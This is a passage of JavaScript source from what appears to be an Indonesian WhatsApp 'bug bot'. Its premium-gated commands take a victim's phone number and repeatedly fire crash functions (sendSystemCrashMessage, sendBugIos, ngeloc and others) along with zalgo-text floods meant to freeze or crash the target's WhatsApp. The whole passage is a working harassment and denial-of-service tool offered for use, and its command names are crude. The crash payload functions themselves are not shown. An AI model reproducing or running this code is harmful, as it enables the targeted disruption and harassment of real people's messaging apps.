await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `Saluran WhatsApp\n https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `Saluran WhatsApp\n https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹`}, {quoted: force})
await sleep(2000)
}
reply(`<,Sukses send Bug Target ✅`)
break

case 'bugpeler':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {image: rzvimage, caption: `∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹`},{quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {image: rzvimage, caption: `∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹`},{quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {image: rzvimage, caption: `∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹`},{quoted: force})
await sleep(2000)
}
reply(`<,Sukses send Bug Target ✅`)
break

case 'send-bug':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥...................... ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌ `}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥...................... ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌ `}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥...................... ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌ `}, {quoted: force})
await sleep(2000)
}
reply(`<,Sukses send Bug Target ✅`)
break

case 'send-penis':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥...................... ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌  🌷*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥...................... ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌  🌷*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥...................... ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌  🌷*`}, {quoted: force})
await sleep(2000)
}
reply(`<,Sukses send Bug Target ✅`)
break

case 'loh-c1':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥...................... ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌ `}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥...................... ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌ `}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥...................... ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌ `}, {quoted: force})
await sleep(2000)
}
reply(`<,Sukses send Bug Target ✅`)
break

case 'whatscrash': case 'rezzxv2': case 'rezzxv3': case 'radzzv1': case 'crashwhat': case 'radzzv3': case 'dipiziv1': case 'dipiziv2': case 'dipizi3':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹`}, {quoted: force})
await sleep(2000)
}
reply(`<,Sukses send Bug Target ✅`)
break

case 'mode-peler': case 'anjay-bisa-gitu': case 'send-bokep': case 'try-hard': 
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rezzx.sendMessage(Pe, {text: `∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹`}, {quoted: force})
await sleep(2000)
}
reply(`<,Sukses send Bug Target ✅`)
break

case 'misi-paket': 
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)

jumlah = 20
sendVariousMessages(from, jumlah)
await sleep(2000)
reply(`*< ✨ > Berhasil Mengirim Bug , Rezz X Radzz X Dipizi Trio Maut Nih😜*`)
break

case 'bang-sehat': 
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)

jumlah = 20
sendVariousMessages(from, jumlah)
await sleep(2000)
reply(`*< ✨ > Berhasil Mengirim Bug , Rezz X Radzz X Dipizi Trio Maut Nih😜*`)
break

case 'assalamualaikum': 
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)

jumlah = 20
sendVariousMessages(from, jumlah)
await sleep(2000)
reply(`*< ✨ > Berhasil Mengirim Bug , Rezz X Radzz X Dipizi Trio Maut Nih😜*`)
break

case 'mau-beraq': 
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)

jumlah = 20
sendVariousMessages(from, jumlah)
await sleep(2000)
reply(`*< ✨ > Berhasil Mengirim Bug , Rezz X Radzz X Dipizi Trio Maut Nih😜*`)
break

case 'suki-ajg': 
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)

jumlah = 20
sendVariousMessages(from, jumlah)
await sleep(2000)
reply(`*< ✨ > Berhasil Mengirim Bug , Rezz X Radzz X Dipizi Trio Maut Nih😜*`)
break

case '😐': case '🐲': case '🖕': case '💋': case '😴': case '🌚':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)

jumlah = 20
sendVariousMessages(from, jumlah)
await sleep(2000)
reply(`*< ✨ > Berhasil Mengirim Bug , Rezz X Radzz X Dipizi Trio Maut Nih😜*`)
break

case 'pap-penis': 
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)

jumlah = 20
sendVariousMessages(from, jumlah)
await sleep(2000)
reply(`*< ✨ > Berhasil Mengirim Bug , Rezz X Radzz X Dipizi Trio Maut Nih😜*`)
break

case 'apa-si':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let j = 0; j < 5; j++) {
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
}
reply(`<,Sukses send Bug Target ✅`)
break

case 'biji-kuda':
if (!isPremium && !isOwner) return reply(`KHUSUS PREMIUM 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`AKMAL MODS , OTW BUG TARGET`)
for (let j = 0; j < 3; j++) {
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
